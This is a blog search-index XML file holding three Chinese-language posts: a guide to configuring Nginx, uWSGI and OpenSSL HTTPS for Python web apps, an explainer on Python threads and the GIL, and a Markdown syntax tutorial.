<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[web服务器纵览]]></title>
    <url>%2F2019%2F03%2F18%2Fweb%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BA%B5%E8%A7%88%2F</url>
    <content type="text"><![CDATA[1.web框架概览1）网络框架及MVC架构 ​ MVC是软件工程中的一种软件架构设计模式，MVC把web应用系统分为如下3个基本部分：模型、视图、控制器，它们各自处理着自己的任务。几乎所有的Python全栈网络框架强制或引导开发者使用MVC架构开发Web应用。 注：全栈网络框架，是指除了封装网络和线程操作，还提供http栈，数据库的读写管理，HTML模板引擎等一系列功能的网络框架。 实现：创建一个作为模型的Student模型对象。StudentView是一个把学生详细信息输出到控制台的视图类，StudentController是负责存储数据到Student对象中的控制类，并相应地更新视图StudentView。MVCPatternDemo是使用StudentController来演示MVC模式用法的演示类。 模型（Model），用于封装与应用程序业务逻辑相关数据的处理，Model层是Web应用程序中处理应用程序的数据逻辑部分。换言之，模型表示企业数据和业务规则（大白话就是后端接口，用于业务处理）。 视图（View），负责数据的展示与呈现。 控制器（Controller），负责接受用户的输入并调用模型和视图去完成用户的需求，控制器本身不输出任何东西和做任何处理。它只是接收请求并决定调用哪个模型构件去处理请求，然后再确定用哪个视图来显示返回的数据。（可以看做是View的反向实现） 当前的主流服务器都实现了主流语言的可调用接口标准，有如下标准。 CGI（Common Gateway Interface），CGI规范允许Web服务器执行外部程序，并将它们的输出发送给Wb服务器，CGI将Web的一组简单的静态超媒体文档变成一个完整的新交互式媒体。 ISAPI（Internet Server Application Program Interface）是微软提供的一套面向Web服务的API接口，它能实现CGI提供的全部功能，并在此基础上进行了扩展（比如提供了过滤应用程序的接口）。 WSGI（Web Server Gateway Interface）是一套专门为Python语言制定的网络服务器标准接口。Python Web框架均以WSGI为基础构建。 ​ 一般来说，最简单的服务器端程序可以是直接读取某文件或返回固定的网页内容；稍复杂一些的服务端程序需要处理客户端通过HTTP、URL、HTML传入的参数、动态的执行逻辑代码、在数据库或者缓存中读写数据等一系列操作，才能最终生成调用结果。 ​ Web服务器是连接用户浏览器和Python服务器端程序的中间节点，在网站建立的过程中有着重要的作用。目前主流的Web服务器包括Nginx、Apache、lighthttpd、IIS等。Python服务端程序在Linux使用最广泛的是Nginx。 2）WSGI接口 ​ WSGI是将Python服务器端程序连接到Web服务器的通用协议。由于WSGI的通用性，出现了独立的WSGI程序，例如uWSGI和Apache的mod_wsgi。 ​ 由上图可知，WSGI的接口可分为两种：一个是与Web服务器接口，另一个是与服务器端程序的接口。WSGI Server与Web服务器的接口包括uwsgi、fastcgi等，服务器端程序的开发者无需学习此部分的详细内容，相反更应该关注WSGI与服务器端程序的接口。 ​ 虽然WSGI的设计目标是连接标准的Web服务器（Nginx，apache）与服务器端程序，但WSGI Server本身也可作为Web服务器运行（但WSGI性能方面不佳，WSGI Server一般只用于测试使用，不能用于正式运行）。 2.Linux+Nginx+uWSGI配 置​ Nginx是Python在Linux环境下的首选Web服务器之一（通常作为高性能http和反向代理服务器，广泛运用于天猫、美团、腾讯等大厂），以下演示在Ubuntu Linux中演示Nginx的安装与配置方法。 1) 安装Nginx 在Ubuntu Linux中可以通过如下命令安装Nginx： sudo apt-get install nginx 安装程序把Nginx以服务的形式安装在系统中，相关的程序及文件路径如下。 程序文件：放在/usr/sbin/nginx目录中。 全局配置文件：/etc/nginx/nginx.conf。 访问日志文件：/var/log/nginx/access.log。 错误日志文件：/var/log/nginx/err.log。 站点配置文件：/etc/nginx/sites-enabled/default。 安装好了，用如下命令启动Nginx服务器： sudo service nginx start 停止Nginx服务器： sudo service nginx stop 查看Nginx服务的状态： sudo service nginx status 重启Nginx服务器： sudo service nginx restart 2) Nginx配置文件 ​ Nginx安装后会以默认方式启动，在开发调试的过程中可能需要调整Nginx的运行参数，这些运行参数会通过全局配置文件(nginx.conf)和站点配置文件(sites-enabled)进行设置，对全局配置文件(/etc/nginx/nginx.conf)中的关键可设置参数解析如下： 1234567891011121314151617181920212223242526272829user www-data; ##定义运行Nginx的用户worker_processes 4; ##Nginx进程数，应设置与系统CPU数量相等的数值worker_rlimit_nofile 65535; ##每个Nginx进程可以打开的最大文件数events&#123; worker_connections 768; ##每个Nginx进程允许的最大客户端连接数 #在Nginx接到一个新连接通知后调用accept()来接受尽量多的连接 multi_accept off;&#125;http&#123; ## # Basic Settings ## sendfile on; ##是否允许文件上传 client_header_buffer_size 32K; ##上传文件大小限制 tcp_nopush on; ##防止网络拥塞 tcp_nodelay on; ##防止网络拥塞 keepalive_timeout 65; ##允许客户端长连接最大秒数 ##Nginx散列表大小。本值越大，占用的内存空间越大，但路由速度很快 types_hash_max_size 2048; access_log /var/log/nginx/access.log; ##访问日志文件路径名 error_log /var/log/nginx/error.log; ##错误日志文件路径名 ## 如下两条用include命令加载站点配置文件 include /etc/nginx/conf.d/*.conf; include /etc/ngigx/sites-enabled/*; &#125; ​ 在每个Nginx服务器中可以运行多个Web站点。每个站点的配置通过站点配置文件设置。每个站点应该以一个单独的配置文件存放在/etc/nginx/sites-enabled目录中，默认站点的配置文件名为/etc/nginx/sites-default，对其中关键内容的解析如下： 12345678910111213141516171819server&#123; ##配置站点监听的端口 listen 80; root /usr/share/nginx/html; ##配置HTTP根页面目录 index index.html index.htm; ##配置HTTP根目录中的默认页面 #站点监听的IP地址，默认的localhost只可用于本机访问，一般需要将其更改为真实IP sever_name localhost; ##location用于配置URL的转发接口 location /user/&#123; ##此处配置http://server_name/user/的转发地址 proxy_pass http://127.0.0.1:8080; &#125; #错误页面配置，如下配置定义HTTP 404错误的显示页面 /404.html error_page 404 /404.html;&#125; 3) 安装uWSGI及配置 ​ uWSGI是WSGI在Linux中的一种实现，这样开发者无需自己编写WSGI Server。使用pip命令可以直接安装uWSGI。 pip install uwsgi 123456789101112131415161718192021222324252627282930313233wjq@Ubuntu:~/TornadoWork/tornado_0/temp/cha5$ uwsgi --http-socket :9090 --plugin python --wsgi-file webapp.pyopen("./python_plugin.so"): No such file or directory [core/utils.c line 3724]!!! UNABLE to load uWSGI plugin: ./python_plugin.so: cannot open shared object file: No such file or directory !!!*** Starting uWSGI 2.0.18 (64bit) on [Sat Mar 16 11:23:32 2019] ***compiled with version: 4.8.4 on 16 March 2019 02:33:42os: Linux-4.4.0-124-generic #148~14.04.1-Ubuntu SMP Thu May 3 07:26:53 UTC 2018nodename: Ubuntumachine: x86_64clock source: unixdetected number of CPU cores: 2current working directory: /home/wjq/TornadoWork/tornado_0/temp/cha5detected binary path: /usr/local/bin/uwsgi!!! no internal routing support, rebuild with pcre support !!!*** WARNING: you are running uWSGI without its master process manager ***your processes number limit is 11929your memory page size is 4096 bytesdetected max file descriptor number: 1024lock engine: pthread robust mutexesthunder lock: disabled (you can enable it with --thunder-lock)uwsgi socket 0 bound to TCP address :9090 fd 3Python version: 2.7.12 (default, Jul 18 2016, 15:07:05) [GCC 4.8.4]*** Python threads support is disabled. You can enable it with --enable-threads ***Python main interpreter initialized at 0x1a33880your server socket listen backlog is limited to 100 connectionsyour mercy for graceful operations on workers is 60 secondsmapped 72920 bytes (71 KB) for 1 cores*** Operational MODE: single process ***WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x1a33880 pid: 4554 (default app)*** uWSGI is running in multiple interpreter mode ***spawned uWSGI worker 1 (and the only) (pid: 4554, cores: 1)[pid: 4554|app: 0|req: 1/1] 59.68.29.48 () &#123;32 vars in 590 bytes&#125; [Sat Mar 16 11:47:29 2019] GET / =&gt; generated 20 bytes in 0 msecs (HTTP/1.1 200) 1 headers in 43 bytes (0 switches on core 0)[pid: 4554|app: 0|req: 2/2] 59.68.29.48 () &#123;32 vars in 571 bytes&#125; [Sat Mar 16 11:47:30 2019] GET /favicon.ico =&gt; generated 20 bytes in 0 msecs (HTTP/1.1 200) 1 headers in 43 bytes (0 switches on core 0)[pid: 4554|app: 0|req: 3/3] 59.68.29.48 () &#123;32 vars in 571 bytes&#125; [Sat Mar 16 11:47:38 2019] GET /favicon.ico =&gt; generated 20 bytes in 0 msecs (HTTP/1.1 200) 1 headers in 43 bytes (0 switches on core 0) ​ uwsgi --http-socket :9090 --plugin python --wsgi-file webapp.py ​ 启动时用-http参数指定了监听端口，用–wsgi-file指定了服务端的程序名。如上所示，uWSGI在启动的过程中会输出系统的一些环境信息：服务器名、进程数限制、服务器硬件配置、最大文件句柄数等。除了在uWSGI 启动命令行提供配置参数，uWSGI 还允许通过一个配置文件设置这些配置参数，比如可以编写如下配置文件，保存在文件名uwsgi.ini中： 123[uwsgi]http = 9090wsgi-file = webapp.py ​ 启动uWSGI时直接指定配置文件即可。 uwsgi uwsgi.ini 除了http和wsgi-file参数，uWSGI还有许多其他参数，常用的如下。 socket: 以WSGI的Socket方式运行，并指定连接地址和端口。该Socket接口是uWSGI与其他Web服务器（Nginx/Apache）等进行对接的方式。 chdir: 指定uWSGI 启动后的当前目录。 processes: 指定启动服务器端程序的进程数。 threads: 指定每个服务器端程序的线程数。即服务器端的总线程数为processes * threads。 uid: 指定运行uWSGI的Linux用户id。 举例，如下配置文件用于以Socket方式启动一个uWSGI服务器，并配置了进程和线程数。 12345[uwsgi]socket = 127.0.0.1: 3011wsgi-file = webapp.pyprocesses = 4threads = 3 4) 集成Nginx与uWSGI ​ 直接通过在站点配置文件中为location配置uwsgi_pass,即可将Nginx与uWSGI集成，建立一个基于Nginx+Python的正式站点。针对如下uWSGI接口有： 123[uwsgi]socket = 127.0.0.1： 3011wsgi_file = webapp.py ​ Nginx的站点配置文件为： 123456789101112server&#123; listen 80;&#125;## 此处改为服务器的真实IP server_name 121.12.134.11;location /&#123; ## 此处IP与Port配置必须与uwsgi接口中参数相同 uwsgi_pass http://127.0.0.1:3011;&#125;'''可以为一个uWSGI配置多个Nginx Server和location，这样就可以实现多域名访问同一个python程序。''' 3.建立安全的HTTPS网站​ 大多数的HTTP站点的协议与数据以明文方式在网络上传输，而HTTPS（HyperText Transfer Protocol over Secure Socket Layer ）是以安全为目标的HTTP通道，即在HTTP下加入SSL层，通过SSL达到数据加密及身份认证的功能。目前大多数银行、证券、交通的网站均以HTTPS方式构建。 ​ OpenSSL是一个强大的免费Socket层密码库，蕴含了主要的密码算法、常用的密钥和证书封装管理功能以及SSL协议。目前大多数网站通过OpenSSL工具搭建HTTPS站点，其步骤如下。 在服务器中安装OpenSSL工具包。 生成SSL密钥和证书。 将证书配置到Web服务器。 在客户端安装CA证书。 ​ 如下记录在Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-124-generic x86_64)下使用OpenSSL的方法，以及Nginx在Linux下的证书配置方式。类似Linux其他发行版、Windows方法类似。 ​ 1）在服务器中安装OpenSSL工具包 ​ 通过如下两条命令安装OpenSSL： 12#sudo apt-get install openssl#sudo apt-get install libssl-dev 命令运行成功后，OpenSSL命令和配置文件将被安装到Linux系统目录中。 OpenSSL命令：/usr/bin/openssl。 配置文件：/usr/lib/ssl/*。 2）生成SSL密钥和证书 1通过如下步骤生成CA证书ca.crt、服务器密钥文件server.key和服务器证书server.crt: 1234567891011#生成CA密钥openssl genrsa -out ca.key 2048#生成CA证书，days参数以天为单位设置证书的有效期。在本过程中会要求输入证书的所在地、公司名、站点名等openssl req -x509 -new -nodes -key ca.key -days 365 -out ca.crt#生成服务器证书RSA的密钥对openssl genrsa -out server.key 2048#生成服务器端证书ca.crtopenssl x509 -req -in server.csr -CA ca.crt -CAKey ca.key -CAcreateserial -out server.crt -days 365 ​ 上述命令生成服务器端证书时，需要在Common Name(CN)字段中如实输入站点的访问地址。即设若要访问www.abc.com进行访问，则必须定义CN=www.abc.com；如果通过IP地址访问，则需设置CN为具体的IP地址。 ​ 3）配置Nginx HTTPS服务器 ​ 在站点配置文件/etc/nginx/sites-enabled/default中添加如下server段，可以定义一个基于HTTPS的接口，该接口的服务器端程序仍旧为uWSGI接口127.0.0.1:3011。 1234567891011server&#123; listen 443; #HTTPS服务端口 server_name 0.0.0.0; #本机上的所有IP地址 ssl on; # ssl_certificate /etc/nginx/ssl/server.crt; ssl_certificate_key /etc/nginx/ssl/server.key;location \ &#123; uwsgi_pass http://127.0.0.1:3011; &#125;&#125; ​ 其中需要注意的参数ssl_certificate和ssl_certificate_key需要分别指定生成的服务器证书和服务器密钥的全路径文件名。到此，我们就可以使用浏览器访问服务器的443端口进行HTTPS加密通信了。]]></content>
      <categories>
        <category>web server</category>
      </categories>
      <tags>
        <tag>web服务器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python多线程]]></title>
    <url>%2F2019%2F03%2F16%2FPython%E5%A4%9A%E7%BA%BF%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[Python多线程1. 同步和异步概念和区别​ 我们经常会看到同步、异步、阻塞、非阻塞四种调用方式以及它们的组合。那同步和异步的概念和区别又是什么呢？ 同步(Sync) ​ 同步的思想就是发出一个功能调用时，在没有得到结果之前，该调用就不返回或继续执行后续操作。 也就是说所有的操作都做完，才返回给用户。(会给人一种程序还在进行，卡死的感觉)，事情需要一件一件的做，等前一件做完了才能做下一件事。 ​ 举例:B/S模式中的表单提交，具体过程是：客户端提交请求-&gt;等待服务器处理-&gt;处理完毕返回，在这个过程中客户端（浏览器）不能做其他事。 异步(Async) ​ 异步与同步相对，当一个异步过程调用发出后，调用者在没有得到结果之前，就可以继续执行后续操作。当这个调用完成后，一般通过状态、通知和回调来通知调用者。对于异步调用，调用的返回并不受调用者控制。 ​ 对于通知调用者的三种方式，具体如下： ​ 状态 ​ 即监听被调用者的状态（轮询），调用者需要每隔一定时间检查一次，效率会很低。 ​ 通知 ​ 当被调用者执行完成后，发出通知告知调用者，无需消耗太多性能。 ​ 回调 ​ 与通知类似，当被调用者执行完成后，会调用调用者提供的回调函数。 ​ 举例:B/S模式中的ajax请求，具体过程是：客户端发出ajax请求-&gt;服务端处理-&gt;处理完毕执行客户端回调，在客户端（浏览器）发出请求后，仍然可以做其他的事。 同步和异步的区别: ​ 请求发出后，是否需要等待结果，才能继续执行其他操作。 2. 多线程的动机​ 在多线程(MT)编程出现之前，程序的运行由一个执行序列组成，执行序列按顺序在主机的中央处理器(CPU)中运行。无论是任务本身要求顺序执行还是整个程序是由多个子任务组成，程序都是按照这种方式执行的，即便子任务相互独立，互相无关(即，一个子任务的结果不影响其他子任务的结果)时也是这样。多线程的目的就是要并行运行这项相互独立的子任务，这样的并行处理可以大幅度的提升整个任务的效率。 ​ 多线程对于某些任务是最理想的，这些任务的特点是：它们本质上就是异步的，需要有多个并发事务，各个事务的运行程序可以是不确定的，随机的，不可预测的。这样的编程任务可以被分为多个执行流，每个流都要有一个要完成的目标。根据应用的不同，这些子任务可能都要计算出一个中间结果，用于合并得到最后的结果。 ​ 使用多线程编程和一个共享的数据结构如Queue（一种多线程队列数据结构），这种程序任务可以用几个功能单一的线程来组织: UserRequestThread：负责读取用户的输入，可能是一个I/O通道。程序可能创建多个线程 每个客户一个，请求会被放到队列中。 RequestProcessor：一个负责从队列中获取并处理请求的线程，它为下面那种线程提供输出。 ReplyThrea：负责把用户的输出取出来，如果是网络应用程序就把结果发送出去，否则就保存在本地系统或者数据库中。 把编程任务用多线程来组织可以降低程序的复杂度，并使得干净，有效和良好组织地程序结构的实现变得可能。并且每个线程的逻辑都不会很复杂，因为它要做的事很清楚。 3. 线程和进程3.1 什么是进程？​ 计算机程序只不过是磁盘中可执行的，二进制（或其他类型）的数据。它们只有在被读取到内存中，被操作系统调用的时候才开始它们的生命期。进程（有时叫重量级进程）是程序的一次执行。每个进程都有自己的地址空间，内存，数据栈以及其它记录其运行轨迹的辅助数据。OS管理在其上运行的所有进程，并为这些进程公平的分配时间。进程也可以通过fork和spawn操作来完成其它的任务。不过各个进程都有自己的内存空间，数据栈等，因此只能使用进程间通信(IPC)，而不能直接共享信息。 ​ 进程和线程的概念、区别和联系 ​ 深入理解线程和进程 3.2 什么是线程？​ 线程（有时也叫轻量级进程）和进程有点像，不同的是，所有的线程运行在同一个进程中，共享相同的运行环境。 ​ 线程有开始，顺序执行和结束三部分。它有一个自己的指令指针，记录自己运行到什么地方。线程的运行可能被抢占（中断），或暂时的被挂起（睡眠），让其他的线程运行，这叫做让步。 ​ 一个进程中的各个线程之间共享同一片数据空间，所以线程之间可以比进程之间更方便地共享数据以及相互通讯。线程一般都是并发执行的，正是由于这种并行和数据共享的机制使得多个任务的合作变为可能。 ​ 在单CPU的系统中，真正的并发是不可能的，每个线程会被安排成每次只运行一小会，然后就把CPU让出来，让其他的线程去运行。在进程的整个运行过程中，每个线程都只做自己的事，在需要的时候跟其他的线程共享运行的结果。当然，这样的共享是存在危险的，如果多个线程共同访问同一片数据，则由于数据的访问顺序不一样，有可能造成结果不一致问题。这就是竞态条件（race condition）。但可以通过大多数线程库带有一系列的同步原语，来控制线程的执行和数据的访问。还有就是由于有的函数会在完成之前阻塞住，在没有特别为多线程做修改的情况下，这种”贪婪”的函数会让CPU的时间分配有所倾斜，导致各个线程分配的运行时间可能不尽相同，不尽公平。 4. Python线程和GIL4.1 全局解释锁（GIL）​ Python代码的执行是由Python虚拟机（也叫解释器主循环）来控制，Python在设计之初就考虑到要在主循环中，同时只有一个线程在执行，就像单CPU系统中运行多个进程那样，内存中可以存放多个程序，但任意时刻，只有一个程序在CPU中运行。同样地道理，虽然Python解释器中可以运行多个线程，但在任意时刻，只有一个线程在解释器中运行。 ​ 对Python虚拟机的访问由全局解释器锁(GIL)来控制，正是这个锁能保证同一时刻只有一个线程在运行。在多线程的环境下，Python虚拟机按以下方式执行： 设置GIL 切换到一个线程去运行 运行 a.指定数量的字节码指令，或者， b.线程主动让出控制（可以调用time.sleep(0)） 把线程设置为睡眠状态 解锁GIL 再次重复以上所有步骤 ​ 在调用外部代码（如C/C++扩展函数）的时候，GIL将会被锁定，直到这个函数结束为止（因为在这期间内有Python的字节码被运行，所以不会做线程切换），编写扩展的程序员可以主动解锁GIL。 ​ 对于I/O密集型的Python程序比计算密集型程序更能充分利用多线程环境的好处。这是因为，对所有面向I/O的（会调用内建的OS的C代码的）程序来说，GIL会在这个I/O调用之前被释放，以允许其它的线程在这个线程等待I/O的时候运行。如果某线程并未使用很多I/O操作，它会在自己的时间片内一直占用处理器和GIL。 ​ GIL的一点源码 4.2 退出线程​ 当一个线程结束计算，它就退出了。线程可以调用thread.exit()之类的退出函数，也可以使用Python退出进程的标准方法，如sys.exit()或抛出一个SystemExit异常等。但是，我们不可以直接kill掉一个进程。 ​ 有两个和线程相关的模块thread和threading，但不建议直接使用thread模块，显而易见的一个原因是当主进程退出的时候，所有其它线程没有被清除就退出了。但另一个模块threading就能确保所有”重要的”子线程都退出后，进程才会结束。 ​ 而且，主线程应当作为一个好的管理者，它要了解每个线程都要做些什么事，线程都需要什么数据和参数，以及在线程结束的时候，它们都提供了什么结果。这样，主线程就可以把各个线程的结果组合成一个有意义的最后结果。 ​ 实际上Python提供了几个用于多线程编程的模块，包括thread,threading和Queue等。thread和threading模块允许程序员创建和管理线程。thread模块提供了基本的线程和锁的支持，而threading提供了更高级别，功能更强的线程管理功能。Queue模块允许用户创建一个用于多个线程之间共享数据的队列数据结构。 4.3 没有线程支持的情况1234567891011121314151617181920212223# -*- coding:utf-8 -*-#onethr.py#!/usr/bin/env pythonfrom time import sleep,ctimedef loop0(): print('start loop0 at:',ctime()) sleep(4) print('loop0 done at:',ctime())def loop1(): print('start loop1 at:', ctime()) sleep(2) print('loop1 done at:', ctime())def main(): print('starting at:', ctime()) loop0() loop1() print('all done at:',ctime())if __name__ == "__main__": main() ​ 我们会使用time.sleep()函数来演示线程是怎样工作的。time.sleep()需要一个浮点型参数，来指定”睡眠”的时间(单位秒)。这就意味着，程序的运行会被挂起指定的时间。 ​ 我们要创建两个”计时循环”。一个睡眠4秒钟，一个睡眠2秒钟，分别是loop0()和loop1().（我们命名为”loop0”和”loop1”表示我们将有一个循环的序列）。 ​ 如果我们在一个进程或者一个线程中，顺序的执行loop0()和loop1()，那运行的总时间为6秒。在启动loop0(),loop1(),和其它的代码时，也要花去一些时间，所以，我们看到的总时间也有可能会是7秒钟。 ​ 假定loop0和loop1里做的不是睡眠，而是各自独立的，不相关的运算，各自的运算结果到最后将会汇总成一个最终的结果。这时，如果能让这些计算并行执行的话，那这样就会减少总的运行时间，这就是多线程编程的前提条件。 4.4 避免使用thread模块​ 不建议使用thread模块，首先是因为更高级别的threading模块更为先进，对线程的支持更为完善，而且使用thread模块里的属性有可能会与threading模块出现冲突。其次，低级别的thread模块的同步原语很少（实际上只有一个），而threading模块则有很多。 ​ 另一个不要使用thread原因是，对于你的进程什么时候应该结束完全没有控制，当主线程结束时，所有的线程都会被强制结束掉，没有警告也不会有正常的清除工作。而threading模块能确保重要的子线程退出后进程才退出。 ​ 只建议那些有经验的专家想访问线程的底层结构的时候，才使用thread模块。 5. thread模块和threading模块5.1 thread模块​ thread模块除了产生线程外，thread模块也提供了基本的同步数据结构锁对象(lock object,也叫原语锁，简单锁，互斥锁，互斥量，二值信号量)，同步原语与线程的管理是密不可分的。 ​ 下表列出常用的线程函数以及LockType类型的锁对象的方法。 函数 描述 thread模块函数 start_new_thread(function,args,kwargs=None) 产生一个新的线程，在新线程中用指定的参数和可选的kwargs来调用这个函数。 allocate_lock() 分配一个LockType类型的锁对象 exit() 让线程退出 LockType类型锁对象方法 acquire(wait=None) 尝试获得锁对象 locked() 如果获取了锁对象返回True,否则返回False release() 释放锁 ​ start_new_thread()函数式thread模块的一个关键函数，它的语法与内建的apply()函数完全一样，其参数为:函数，函数的参数以及可选的关键字参数。不同的是，函数不是在主线程里运行，而是产生一个新的线程来运行这个函数。 ​ 这里我们执行的是和onethr.py中一样的循环，不同的是，这一次我们使用的是thread模块提供的多线程的机制。两个循环并发的执行（显然，短的那个先结束）。总的运行时间为最慢的那个线程的运行时间，而不是所有线程的运行时间之和。 ​ 12345678910111213141516171819202122232425# -*- coding:utf-8 -*-#!/usr/bin/env python#mtsleep1.pyimport thread #需要python2环境from time import sleep,ctimedef loop0(): print('start loop0 at:',ctime()) sleep(4) print('loop0 done at:',ctime())def loop1(): print('start loop1 at:', ctime()) sleep(2) print('loop1 done at:', ctime())def main(): print('starting at:', ctime()) thread.start_new_thread(loop0,()) thread.start_new_thread(loop1,()) sleep(6) print('all done at:',ctime())if __name__ == "__main__": main() ​ 这个程序的输出与之前的输出大不相同，之前是运行了6,7秒，而现在则是4秒，是最长的循环的运行时间和其它代码的时间之和。睡眠4秒和睡眠2秒是并发执行的，这样就使得总的运行时间被缩短了。loop1在loop0前面就结束了，而且程序多了一个sleep(6)的函数调用。为什么要加入sleep(6)，这是因为如果没有让主线程停下来，那主线程就会运行下一条语句，显示”all done”，然后就关闭了运行着的loop0()和loop1()的两个线程，退出了。 ​ 的确这里应该有更好的管理线程的办法，而不是在主线程里面做一个额外的延时6s的操作。也就是说，我们要写让主线程停下来等所有子线程结束之后再继续运行的代码，这也是线程需要同步的原因。用sleep()函数做线程的同步操作是不可靠的，因为如果有循环的执行时间不能事先确定的话，这可能会造成主线程过早或过晚退出，这就要用到锁了。 Python多进程Python多进程和多线程参考扩展阅读Python并发编程理论部分1 并发编程理论部分2 Python模块学习:threading多线程控制和处理 Python中的multiprocessing和threading Python 多线程 threading和multiprocessing模块 Python并发编程之协程/异步IO 1.python多进程Python多进程基本说明 实现多进程的几种方式 Python多进程使用说明 2.python多线程Python核心编程-多线程 Python的一种线程池模型 多种方式实现Python线程池 假的多线程 一个进程内运行多个python虚拟机 ​ 说明：如果想让python多线程，真正支持多核，那么应该 1、重写python编译器(官方cpython)如使用：PyPy解释器 2、调用C语言的链接库 。 ​ 而实际上，多核多线程比单核多线程更差，原因是单核下多线程，每次释放GIL，唤醒的那个线程都能获取到GIL锁，所以能够无缝执行，但多核下，CPU0释放GIL后，其他CPU上的线程都会进行竞争，但GIL可能会马上又被CPU0拿到，导致其他几个CPU上被唤醒后的线程会醒着等待到切换时间后又进入待调度状态，这样会造成线程颠簸(thrashing)，导致效率更低 。 3.python协程​ Python并行的最好策略应当是多进程+协程，既充分利用多核，又充分发挥协程的高效率，可获得极高的性能。 。 ​ Python协程概念 ​ Python协程的一点剖析]]></content>
  </entry>
  <entry>
    <title><![CDATA[markdown入门_1]]></title>
    <url>%2F2018%2F05%2F08%2Fmarkdown%E5%85%A5%E9%97%A8-1%2F</url>
    <content type="text"><![CDATA[Markdown基本语法介绍 参考链接:https://www.jianshu.com/p/b03a8d7b1719 简明教程：https://ouweiya.gitbooks.io/markdown/ 有道云MarkDown教程：http://note.youdao.com/iyoudao/?p=2411 W3cShcool:https://www.w3cschool.cn/lme/t13p1sri.html 1.标题代码注：#后面保持空格 12345678910# h1## h2### h3#### h4##### h5###### h6####### h7 // 错误代码######## h8 // 错误代码######### h9 // 错误代码########## h10 // 错误代码 演示h1h2h3h4h5h6####### h7 ######## h8 ######### h9 ########## h10 2.分级标题代码 注：=-最少可以只写一个，兼容性一般 1234一级标题======================二级标题--------------------- 演示一级标题二级标题3.Toc代码 注：根据标题生成目录 1[TOC] 演示[TOC] 引用行内标记++代码块++插入链接插入图片插入图片带有链接序表任务列表表情表格支持内嵌CSS样式4.引用代码1（单行式）1&gt;hello world! 演示 hello world 代码2（多行式）123&gt; hello world!hello world!hello world! 或者123&gt;hello world!&gt;hello world!&gt;hello world! 演示 hello world!hello world!hello world! 代码3（多层嵌套）123&gt; aaaaaaaa&gt;&gt; bbbbbbbb&gt;&gt;&gt; cccccccc 演示 aaaaaaaa bbbbbbbb ccccccccc 5.行内标记 注：用 ` 标记代码块将变成一行 代码1标记之外`hello world`标记之外 演示标记之外hello world标记之外 错误代码 注：不同平台错误略有差异1234567 标记之外 ` &lt; div&gt; &lt; div&gt;&lt;/div&gt; &lt; div&gt;&lt;/div&gt; &lt; div&gt;&lt;/div&gt;&lt; /div&gt;`标记之外 演示 标记之外 &lt; div&gt; &lt; div&gt;&lt;/div&gt; &lt; div&gt;&lt;/div&gt; &lt; div&gt;&lt;/div&gt; &lt; /div&gt; 标记之外 6.代码块 注：与上行距离一空行 **代码1(123&gt; 注：用```生成块 #### 演示 123**代码2(Tab)**&gt; 注：Tab缩进 #### 演示 我是文字…… &lt;div&gt; &lt;div&gt;&lt;/div&gt; &lt;div&gt;&lt;/div&gt; &lt;div&gt;&lt;/div&gt; &lt;/div&gt; 123456789**代码3(自定义语法)**&gt; 注：根据不同的语言配置不同的代码颜色 ```javascriptvar num = 0;for (var i = 0; i &lt; 5; i++) &#123; num+=i;&#125;console.log(num); 7.插入链接代码1(内链式) 注：{:target=”_blank”}跳转方式兼容性一般 ，多数第三方平台不支持跳转 1[百度1](http://www.baidu.com/&quot; 百度一下&quot;)&#123;:target=&quot;_blank&quot;&#125; 演示百度1 代码2(引用式)12[百度2][2]&#123;:target=&quot;_blank&quot;&#125;[2]: http://www.baidu.com/ &quot;百度二下&quot; 演示百度2 8.插入图片代码1(内链式)1![](./01.png &apos;描述&apos;) 演示 代码2(引用式)12![name][01][01]: ./01.png &apos;描述&apos; 演示![name][01] [01]: C:/Users/wjq/Desktop/markdown/images/01.png ‘描述’ 9.插入图片带有链接代码1234[![](./01.png &apos;百度&apos;)](http://www.baidu.com)&#123;:target=&quot;_blank&quot;&#125; // 内链式[![](./01.png &apos;百度&apos;)][5]&#123;:target=&quot;_blank&quot;&#125; // 引用式[5]: http://www.baidu.com 演示内链式 引用式{:target=”_blank”} 10.视频插入 注: Markdown语法是不支持直接插入视频的12普遍的做法是 插入HTML的 iframe 框架，通过网站自带的分享功能获取，如果没有可以尝试第二种方法第二是伪造播放界面，实质是插入视频图片，然后通过点击跳转到相关页面 代码1 注: 多数第三方平台不支持插入视频1&lt;iframe height=498 width=510 src=&apos;http://player.youku.com/embed/XMjgzNzM0NTYxNg==&apos; frameborder=0 &apos;allowfullscreen&apos;&gt;&lt;/iframe&gt; 代码21[![](./youku2.png)](http://v.youku.com/v_show/id_XMjgzNzM0NTYxNg==.html?spm=a2htv.20009910.contentHolderUnit2.A&amp;from=y1.3-tv-grid-1007-9910.86804.1-2#paction)&#123;:target=&quot;_blank&quot;&#125; 11.序表代码1(有序) 1231. one2. two3. three 演示 one two three 代码2(无序) 123* one* two* three 演示 one two three 代码3(序表嵌套)1234561. one 1. one-1 2. two-22. two * two-1 * two-2 演示 one one-1 two-2 two two-1 two-2 代码4(序表嵌套代码块) 注: 换行+两个Tab12* one var a = 10; //与上行保持空行并递归缩进 演示 one var a = 10; //与上行保持空行并递归缩进 12.任务列表 注：兼容性一般 要隔开一行12345这是文字……- [x] 选项一- [ ] 选项二 - [ ] [选项3] 演示 选项一 选项二 [ ] [选项3] 13.表情 注：兼容一般 14.表格 注：: 代表对齐方式 , : 与 | 之间不要有空格，否则对齐会有些不兼容 代码1 1234| a | b | c | |:-------:|:------------- | ----------:| | 居中 | 左对齐 | 右对齐 ||=========|===============|============| 演示 a b c 居中 左对齐 右对齐 ========= =============== ============ 代码2(简约写法)1234a | b | c :-:|:- |-: 居中 | 左对齐 | 右对齐 ============|=================|============= 演示 a b c 居中 左对齐 右对齐 ============ ================= ============= 代码3(特殊表格) 注: 一般对合并单元格，以及其他特殊格式表格，markdown 是无能为力的 所以常规的做法是使用HTML标签，但是这样的编写效率极低。 但是有了这款工具的话，所有问题都迎刃而解. 在线生成HTML代码 Tables Generator (国外的站) 15.支持内嵌的CSS样式 代码1&lt;p style=&quot;color: #AD5D0F;font-size: 30px; font-family: &apos;宋体&apos;;&quot;&gt;内联样式&lt;/p&gt; 演示内联样式 16.语义标记 描述 效果 代码 斜体 斜体 *斜体* 斜体 斜体 _斜体_ 加粗 加粗 **加粗** 加粗+斜体 加粗+斜体 ***加粗+斜体*** 加粗+斜体 加粗+斜体 